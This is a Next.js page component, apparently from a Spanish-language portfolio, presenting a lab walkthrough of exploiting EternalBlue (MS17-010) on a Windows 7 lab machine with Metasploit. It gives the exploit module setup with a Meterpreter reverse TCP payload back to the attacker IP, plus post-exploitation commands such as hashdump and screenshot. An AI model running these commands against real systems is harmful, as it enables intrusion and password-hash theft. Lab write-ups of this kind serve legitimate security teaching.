'use client';

import React, { useEffect } from 'react';
import Image from 'next/image';
import { useRouter } from 'next/navigation';

export default function MetasploitLab() {
  const router = useRouter();
  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);

  return (
    <>
      {/* Botón Volver */}
      <button
        onClick={() => router.push('/#labs')}
        className="fixed top-6 left-6 z-50 bg-muted/80 hover:bg-muted/60 text-foreground px-4 py-2 rounded-lg shadow-md flex items-center gap-2 transition-colors"
        style={{ minWidth: 90 }}
        aria-label="Volver"
      >
        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2" className="inline-block">
          <path strokeLinecap="round" strokeLinejoin="round" d="M15 19l-7-7 7-7" />
        </svg>
        Volver
      </button>
      {/* Contenido principal */}
      <div className="container py-12 px-4 mx-auto max-w-4xl">
        <h1 className="text-4xl md:text-5xl font-bold mb-10 text-center">
          Explotación de Vulnerabilidades en Windows con Metasploit
        </h1>

        {/* Objetivo del laboratorio */}
        <section className="mb-10">
          <h2 className="text-2xl font-bold mb-3">Objetivo del laboratorio</h2>
          <hr className="mb-6 border-t border-border" />
          <p className="text-foreground text-justify">
            Este laboratorio detalla el proceso de explotación de la vulnerabilidad MS17-010 (EternalBlue) en un sistema Windows 7
            utilizando la interfaz de línea de comandos (CLI) del Metasploit Framework. El objetivo es demostrar cómo identificar,
            explotar y realizar acciones post-explotación en un sistema vulnerable.
          </p>
        </section>

         {/* Descripción */}
        <section className="mb-10">
          <h2 className="text-2xl font-semibold mb-4">Descripción del Laboratorio</h2>
          {/* Línea divisoria */}
          <hr className="mb-6 border-t border-border" />
          <p className="text-justify text-foreground">
            Este laboratorio se centra en la explotación de la vulnerabilidad MS17-010, conocida como EternalBlue, que afecta a sistemas Windows 7.
            Utilizando Metasploit, se demuestra cómo un atacante puede aprovechar esta vulnerabilidad para obtener
            acceso remoto al sistema víctima. El proceso incluye la configuración del entorno, la identificación de la vulnerabilidad,
            la explotación y la post-explotación para obtener información sensible del sistema comprometido.
          </p>
        </section>

        {/* Herramientas utilizadas */}
        <section className="mb-10">
          <h2 className="text-2xl font-bold mb-3">Herramientas utilizadas</h2>
          <hr className="mb-6 border-t border-border" />
          <ul className="list-disc pl-6 space-y-2 text-foreground">
            <li><b>Kali Linux</b> (máquina atacante)</li>
            <li><b>Windows 7 Ultimate SP1</b> (máquina víctima)</li>
            <li><b>Metasploit Framework</b> (herramienta de explotación)</li>
            <li><b>PostgreSQL</b> (base de datos para Metasploit)</li>
          </ul>
        </section>

        {/* Procedimiento paso a paso */}
        <section className="mb-10">
          <h2 className="text-2xl font-bold mb-3">Procedimiento paso a paso</h2>
          <hr className="mb-6 border-t border-border" />

          {/* Paso 1 */}
          <div className="mb-8">
            <h3 className="text-xl font-semibold mb-4">1. Configuración del entorno</h3>
            <p className="mb-4">Iniciar los servicios necesarios y la consola de Metasploit:</p>
            <div className="bg-muted p-4 rounded-md my-4 overflow-x-auto">
              <pre className="text-sm"><code>sudo systemctl start postgresql
sudo msfdb init
msfconsole</code></pre>
            </div>
            <div className="flex justify-center my-4">
              <Image
                src="/lab1/metasploit/0.webp"
                alt="Inicio de msfconsole"
                width={500}
                height={320}
                className="rounded-lg shadow"
              />
            </div>
          </div>

          {/* Paso 2 */}
          <div className="mb-8">
            <h3 className="text-xl font-semibold mb-4">2. Reconocimiento de la red</h3>
            <p className="mb-4">Verificar la conectividad entre las máquinas y obtener información del objetivo:</p>
            <div className="grid grid-cols-1 gap-6">
              <div>
                <h4 className="text-lg font-semibold mb-2">Información de la máquina víctima</h4>
                <div className="bg-muted p-4 rounded-md my-4 overflow-x-auto">
                  <pre className="text-sm"><code># Máquina Atacante (Kali Linux)
IP: 192.168.88.128

# Máquina Víctima (Windows 7)
IP: 192.168.88.129
Versión: Windows 7 Ultimate SP1 (6.1.7601)</code></pre>
                </div>
                <div className="flex justify-center my-4">
                  <Image
                    src="/lab1/metasploit/2.webp"
                    alt="Configuración IP de Windows"
                    width={500}
                    height={320}
                    className="rounded-lg shadow"
                  />
                </div>
              </div>
            </div>
          </div>

          {/* Paso 3 */}
          <div className="mb-8">
            <h3 className="text-xl font-semibold mb-4">3. Explotación de la vulnerabilidad MS17-010 (EternalBlue)</h3>
            <p className="mb-4">Configurar y ejecutar el exploit EternalBlue:</p>
            <div className="bg-muted p-4 rounded-md my-4 overflow-x-auto">
              <pre className="text-sm"><code>use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.88.129  # IP de la víctima
set LHOST 192.168.88.128   # IP del atacante
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run</code></pre>
            </div>
            <div className="flex justify-center my-4">
              <Image
                src="/lab1/metasploit/3.webp"
                alt="Configuración del exploit"
                width={500}
                height={320}
                className="rounded-lg shadow"
              />
            </div>
          </div>

          {/* Paso 4 */}
          <div className="mb-8">
            <h3 className="text-xl font-semibold mb-4">4. Post-explotación</h3>
            <p className="mb-4">Comandos útiles para la fase de post-explotación:</p>
            <div className="bg-muted p-4 rounded-md my-4 overflow-x-auto">
              <pre className="text-sm"><code>sysinfo        # Obtener información del sistema
getuid         # Ver usuario actual
screenshot     # Capturar pantalla
shell          # Obtener shell del sistema
hashdump       # Extraer hashes de contraseñas</code></pre>
            </div>
            <div className="space-y-6">
              <div>
                <h4 className="text-lg font-semibold mb-2">Información del sistema comprometido</h4>
                <Image
                  src="/lab1/metasploit/lanzamos el primer ataque para ver la info del sistema.webp"
                  alt="Información del sistema"
                  width={500}
                  height={320}
                  className="rounded-lg shadow mb-4"
                />
              </div>
              <div>
                <h4 className="text-lg font-semibold mb-2">Captura de pantalla remota</h4>
                <Image
                  src="/lab1/metasploit/segundo ataque, screenshot, pantallazo a la pantalla del equipo de la victima.webp"
                  alt="Captura de pantalla del sistema víctima"
                  width={900}
                  height={600}
                  className="rounded-lg shadow mb-4"
                />
              </div>
              <div>
                <h4 className="text-lg font-semibold mb-2">Shell del sistema y escalamiento de privilegios</h4>
                <Image
                  src="/lab1/metasploit/tercer ataque, shell,escalamiento de privilegios.webp"
                  alt="Shell del sistema"
                  width={500}
                  height={320}
                  className="rounded-lg shadow mb-4"
                />
              </div>
            </div>
          </div>
        </section>

        {/* Resultados esperados */}
        <section className="mb-10">
          <h2 className="text-2xl font-bold mb-3">Resultados esperados</h2>
          <hr className="mb-6 border-t border-border" />
          <p className="text-foreground text-justify">
            Al completar este laboratorio, se habrá logrado:
          </p>
          <ul className="list-disc pl-6 space-y-2 text-foreground mt-4">
            <li>Explotar exitosamente la vulnerabilidad MS17-010 en Windows 7</li>
            <li>Obtener acceso remoto al sistema mediante una sesión Meterpreter</li>
            <li>Ejecutar comandos de post-explotación para extraer información sensible</li>
            <li>Demostrar el impacto de sistemas desactualizados en la seguridad</li>
          </ul>
        </section>

        {/* Aviso legal */}
        <div className="bg-destructive/10 p-6 rounded-lg mt-8">
          <h4 className="text-lg font-semibold mb-2 text-destructive">⚠️ Aviso legal</h4>
          <p className="text-foreground text-justify">
            Este laboratorio debe realizarse únicamente en un entorno controlado y con permiso explícito.
            La explotación no autorizada de sistemas puede tener graves consecuencias legales. El objetivo
            es puramente educativo para comprender el funcionamiento de las vulnerabilidades y mejorar las
            defensas de los sistemas.
          </p>
        </div>
      </div>
    </>
  );
}